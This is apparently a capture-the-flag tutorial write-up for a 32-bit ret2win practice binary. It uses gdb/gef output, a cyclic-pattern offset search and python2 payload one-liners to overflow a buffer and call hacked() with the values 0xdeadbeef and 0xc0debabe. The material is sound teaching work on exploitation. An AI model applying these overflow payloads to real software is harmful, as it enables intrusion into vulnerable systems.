# Level 04

Moving on to level 04. There are two version and we will start with 32-bit. This level is the same as the last one, but the ```hacked()``` function has two parameters that we need to pass it in order for the call to work. Parameter passing works differently on 32-bit than 64-bit so this time, it actually matters what the binary is compiled as.

## 32-Bit

Looking in the directory, we see the following: ```exploit.py ret2win_params ret2win_params.c ropstar.py```. As always, lets run the binary, check the file type, and check and protections it has.

``` Bash
$ chmod +x ret2win_params
$ ./ret2win_params
Name:
test
Hi there, test

$ file ret2win_params
ret2win_params: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=57b54d38f04bf11e85baa1619dc95228d8fd14b1, for GNU/Linux 3.2.0, not stripped

$ checksec --file=ret2win_params
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable   FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               1             ret2win_params
```
Here, we see the binary runs the same as the last level, adn we can confirm that it is 32-bit. Lastly, there are no protections on the binary that we need to worry about.
Lets open ghidra and check out the new ```hacked()``` function and see what we need to do. The other two functions are the same from the last level so we don't need to worry about those

``` C
/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */

void hacked(int first,int second)

{
  if ((first == 0xdeadbeef) && (second == 0xc0debabe)) {
    puts("This function is TOP SECRET! How did you get in here?! :O");
  }
  else {
    puts("Unauthorised access to secret function detected, authorities have been alerted!!");
  }
  return;
}
```
We see that the function takes in two ```int ``` parameters and then checks that the first one is equal to ```0xdeadbeef``` in hex and ```0xc0debabe``` in hex. So, we know that we need three things: To overwrite the return address to the ```hacked()``` function, set the variable ```first``` to ```0xdeadbeef```, and then set the variable ```second``` to ```0xc0debabe```.
Lets start by setting the return address to the ```hacked()``` function. First, we'll make our cyclic string and see where the return address is being stored

``` Bash
$ pwn cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Now we'll open gdb, set a breakpoint at the return address of ```register_name()``` and pass in that cyclic string for our name

``` Bash
gef➤  disas register_name
Dump of assembler code for function register_name:
   0x080491d5 <+0>:     push   ebp
   0x080491d6 <+1>:     mov    ebp,esp
   0x080491d8 <+3>:     push   ebx
   0x080491d9 <+4>:     sub    esp,0x14
   0x080491dc <+7>:     call   0x80490c0 <__x86.get_pc_thunk.bx>
   0x080491e1 <+12>:    add    ebx,0x2e1f
   0x080491e7 <+18>:    sub    esp,0xc
   0x080491ea <+21>:    lea    eax,[ebx-0x1f6b]
   0x080491f0 <+27>:    push   eax
   0x080491f1 <+28>:    call   0x8049040 <puts@plt>
   0x080491f6 <+33>:    add    esp,0x10
   0x080491f9 <+36>:    sub    esp,0x8
   0x080491fc <+39>:    lea    eax,[ebp-0x18]
   0x080491ff <+42>:    push   eax
   0x08049200 <+43>:    lea    eax,[ebx-0x1f65]
   0x08049206 <+49>:    push   eax
   0x08049207 <+50>:    call   0x8049060 <__isoc99_scanf@plt>
   0x0804920c <+55>:    add    esp,0x10
   0x0804920f <+58>:    sub    esp,0x8
   0x08049212 <+61>:    lea    eax,[ebp-0x18]
   0x08049215 <+64>:    push   eax
   0x08049216 <+65>:    lea    eax,[ebx-0x1f62]
   0x0804921c <+71>:    push   eax
   0x0804921d <+72>:    call   0x8049030 <printf@plt>
   0x08049222 <+77>:    add    esp,0x10
   0x08049225 <+80>:    nop
   0x08049226 <+81>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049229 <+84>:    leave  
   0x0804922a <+85>:    ret    
End of assembler dump.
gef➤  b *0x0804922a
Breakpoint 1 at 0x804922a
gef➤  r
Starting program: /home/vagrant/Desktop/practice/CTF/pwn/binary_exploitation_101/04-ret2win_with_params/32-bit/ret2win_params 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Name:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Breakpoint 1, 0x0804922a in register_name ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6f      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcf6c  →  "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x8049250  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x804922a  →  <register_name+85> ret 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf6c│+0x0000: "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"    ← $esp
0xffffcf70│+0x0004: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0xffffcf74│+0x0008: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcf78│+0x000c: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcf7c│+0x0010: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcf80│+0x0014: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcf84│+0x0018: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf88│+0x001c: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049227 <register_name+82> pop    ebp
    0x8049228 <register_name+83> cld    
    0x8049229 <register_name+84> leave  
 →  0x804922a <register_name+85> ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x804922a in register_name (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804922a → register_name()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6f      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcf6c  →  "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x8049250  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x804922a  →  <register_name+85> ret 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf6c│+0x0000: "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"    ← $esp
0xffffcf70│+0x0004: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0xffffcf74│+0x0008: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcf78│+0x000c: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcf7c│+0x0010: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcf80│+0x0014: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcf84│+0x0018: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf88│+0x001c: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049227 <register_name+82> pop    ebp
    0x8049228 <register_name+83> cld    
    0x8049229 <register_name+84> leave  
 →  0x804922a <register_name+85> ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x804922a in register_name (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804922a → register_name()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  ni
0x61616168 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6f      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcf70  →  "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x8049250  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616168 ("haaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf70│+0x0000: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"    ← $esp
0xffffcf74│+0x0004: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcf78│+0x0008: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcf7c│+0x000c: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcf80│+0x0010: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcf84│+0x0014: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf88│+0x0018: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf8c│+0x001c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616168
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x61616168 in ?? (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────






[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6f      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcf70  →  "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x8049250  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616168 ("haaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf70│+0x0000: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"    ← $esp
0xffffcf74│+0x0004: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcf78│+0x0008: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcf7c│+0x000c: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcf80│+0x0010: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcf84│+0x0014: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf88│+0x0018: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf8c│+0x001c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616168
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x61616168 in ?? (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
Here, we see that after setting a breakpoint, running the program, entering our cyclic string, and entering ```ni``` to move to the next instruction, that ```$eip``` is set to ```haaa```. Running ```pwn cyclic -l haaa```, we see that the offset is ```28``` bytes.
Now, we need to set up our payload with 28 bytes of padding, then our return address, and then check where our parameters are being stored. Since 32-bit reads everything off the stack, we don't need to worry about putting the parameters in registers like 64-bit, we can simply put them on the stack by overwriting it.
To construct our payload, we need to find the ```hacked()``` address
``` Bash
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  printf@plt
0x08049040  puts@plt
0x08049050  __libc_start_main@plt
0x08049060  __isoc99_scanf@plt
0x08049070  _start
0x080490b0  _dl_relocate_static_pie
0x080490c0  __x86.get_pc_thunk.bx
0x080490d0  deregister_tm_clones
0x08049110  register_tm_clones
0x08049150  __do_global_dtors_aux
0x08049180  frame_dummy
0x08049182  hacked
0x080491d5  register_name
0x0804922b  main
0x08049247  __x86.get_pc_thunk.ax
0x08049250  __libc_csu_init
0x080492b0  __libc_csu_fini
0x080492b1  __x86.get_pc_thunk.bp
0x080492b8  _fini
gef➤ 
```
Now we can construct our payload with the ```hacked()``` address.

``` Python
python2 -c 'print "a" * 28 + "\x82\x91\x04\x08" + "BBBB" + "CCCC" + "DDDD" + "EEEE"' > testPayload
```
This will allow us to return to the ```hacked()``` function, and then examine the stack to see which strings make it to our parameters.

``` Bash
 →  0x804922a <register_name+85> ret    
   ↳   0x8049182 <hacked+0>       push   ebp
       0x8049183 <hacked+1>       mov    ebp, esp
       0x8049185 <hacked+3>       push   ebx
       0x8049186 <hacked+4>       sub    esp, 0x4
       0x8049189 <hacked+7>       call   0x8049247 <__x86.get_pc_thunk.ax>
       0x804918e <hacked+12>      add    eax, 0x2e72
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x804922a in register_name (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804922a → register_name()
[#1] 0x8049182 → frame_dummy()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
Here, we can see that we have successfully overwritten the return address and will return execution to the hacked function, not we need to set a breakpoint at first the compare instruction in hacked to examine memory at that point.

``` Bash
gef➤  disas hacked
Dump of assembler code for function hacked:
   0x08049182 <+0>:     push   ebp
   0x08049183 <+1>:     mov    ebp,esp
   0x08049185 <+3>:     push   ebx
   0x08049186 <+4>:     sub    esp,0x4
   0x08049189 <+7>:     call   0x8049247 <__x86.get_pc_thunk.ax>
   0x0804918e <+12>:    add    eax,0x2e72
   0x08049193 <+17>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804919a <+24>:    jne    0x80491bb <hacked+57>
   0x0804919c <+26>:    cmp    DWORD PTR [ebp+0xc],0xc0debabe
   0x080491a3 <+33>:    jne    0x80491bb <hacked+57>
   0x080491a5 <+35>:    sub    esp,0xc
   0x080491a8 <+38>:    lea    edx,[eax-0x1ff8]
   0x080491ae <+44>:    push   edx
   0x080491af <+45>:    mov    ebx,eax
   0x080491b1 <+47>:    call   0x8049040 <puts@plt>
   0x080491b6 <+52>:    add    esp,0x10
   0x080491b9 <+55>:    jmp    0x80491cf <hacked+77>
   0x080491bb <+57>:    sub    esp,0xc
   0x080491be <+60>:    lea    edx,[eax-0x1fbc]
   0x080491c4 <+66>:    push   edx
   0x080491c5 <+67>:    mov    ebx,eax
   0x080491c7 <+69>:    call   0x8049040 <puts@plt>
   0x080491cc <+74>:    add    esp,0x10
   0x080491cf <+77>:    nop
   0x080491d0 <+78>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491d3 <+81>:    leave  
   0x080491d4 <+82>:    ret    
End of assembler dump.
gef➤  b *0x08049193
Breakpoint 2 at 0x8049193
gef➤  c
Continuing.
```
This will run the program to the breakpoint that we set. We can see that at the first compare instruction, we are comparing ```$ebp + 0x8``` to ```0xdeadbeef```. This means that the ```first``` variable is being pulled from that location on the stack. Lets examine what it currently is by running

``` Bash
gef➤  x $ebp + 0x8
0xffffcf74:     0x43434343
```
If we run ```pwn unhex 43434343``` we see that the string is ```CCCC```. This means that ```first``` is currently ```CCC``` so in our payload, we need to replace ```CCCC``` with ```0xdeadbeef```. Lets add that to our payload so we can pass this comparison and check the ```second``` variable.

``` Python
python2 -c 'print "a" * 28 + "\x82\x91\x04\x08" + "BBBB" + "\xef\xbe\xad\xde" + "DDDD" + "EEEE"' > testPayload
```
Now, lets do the same thing in gdb to check the ```second``` variable since we should now pass the first check.

``` Bash
 →  0x804919c <hacked+26>      cmp    DWORD PTR [ebp+0xc], 0xc0debabe
    0x80491a3 <hacked+33>      jne    0x80491bb <hacked+57>
    0x80491a5 <hacked+35>      sub    esp, 0xc
    0x80491a8 <hacked+38>      lea    edx, [eax-0x1ff8]
    0x80491ae <hacked+44>      push   edx
    0x80491af <hacked+45>      mov    ebx, eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x804919c in hacked (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804919c → hacked()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x $ebp + 0xc
0xffffcf78:     0x44444444
gef➤
```
I put a breakpoint at the second compare instruction and then examined the memory that it was comparing to ```0xc0debabe```. If we run ```pwn unhex 44444444``` we see the string is ```DDDD```. All we need to do now is put ```0xc0debabe``` in the ```DDDD``` section of our payload

``` Python
python2 -c 'print "a" * 28 + "\x82\x91\x04\x08" + "BBBB" + "\xef\xbe\xad\xde" + "\xbe\xba\xde\xc0"' > testPayload
```
Now, we can simply run ```./ret2win_params < testPayload``` and we should see the following output
``` Bash
Name:
Hi there, aaaaaaaaaaaaaaaaaaaaaaaaaaaa�BBBBﾭ޾���
This function is TOP SECRET! How did you get in here?! :O
zsh: segmentation fault  ./ret2win_params < testPayload
```
Awesome, we did it! We were able to call ```hacked()``` and pass it the correct parameters in the correct order! You may be wondering though what the ```BBBB``` stands for in our payload? 
That is the return address for the ```hacked()``` function. This is where the ```hacked()``` function will return to when it finishes execution.
